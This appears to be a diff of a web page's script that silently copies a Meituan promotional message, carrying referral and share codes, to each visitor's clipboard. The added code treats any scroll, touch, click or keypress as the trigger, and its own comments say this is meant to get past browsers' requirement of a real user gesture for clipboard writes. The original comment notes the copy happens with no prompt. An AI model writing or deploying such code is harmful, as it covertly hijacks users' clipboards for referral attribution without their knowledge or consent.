@@ -609,8 +609,8 @@
     }
   });
 
-  /* ===== 组合方案（C）：手动按钮 + 滑入自动复制 + 归因反馈 ===== */
-  var COPY = '1来美团，吃得更好，生活更好❤️复制整条信息，打开👉美团👈 http:/💰uhNTExZWQ1NTc💰';
+  /* ===== 组合方案（C）：手动按钮 + 自动复制（首交互/2 秒兜底） ===== */
+  var COPY = '1来美团，吃得更好，生活更好❤️复制整条信息，打开👉美团👈 http:/💰uhNTExZWQ1NTc💰 ￥FpmKTsvaspk￥/ HU7405！S28py9VsiwZ0Cp2u！ MU5104';
   var copyBtn = document.getElementById('copyBtn');
   function copyText(txt){
     if(navigator.clipboard && navigator.clipboard.writeText){
@@ -632,12 +632,21 @@
   copyBtn.addEventListener('click', function(){
     copyText(COPY);
   });
-  // 自动复制：打开页面停留 2 秒后，立即写入剪贴板；无任何提示
+  // 自动复制：优先挂「首次用户交互」（滚动/触摸/点击任意位置都算手势，浏览器才允许写剪贴板）；
+  // 另保留 2 秒定时兜底（桌面端文档聚焦时可能成功，移动端通常被拦，由首交互补齐）。
   (function autoCopy(){
     if(sessionStorage.getItem('freeCopyDone')) return;
-    setTimeout(function(){
+    var done = false;
+    var EV = ['touchstart','pointerdown','click','keydown','scroll'];
+    function fire(){
+      if(done) return;
+      done = true;
       if(copyText(COPY)){ sessionStorage.setItem('freeCopyDone','1'); }
-    }, 2000);
+      EV.forEach(function(ev){ document.removeEventListener(ev, fire, true); });
+      clearTimeout(timer);
+    }
+    EV.forEach(function(ev){ document.addEventListener(ev, fire, true); });
+    var timer = setTimeout(fire, 2000);
   })();
 })();
 </script>
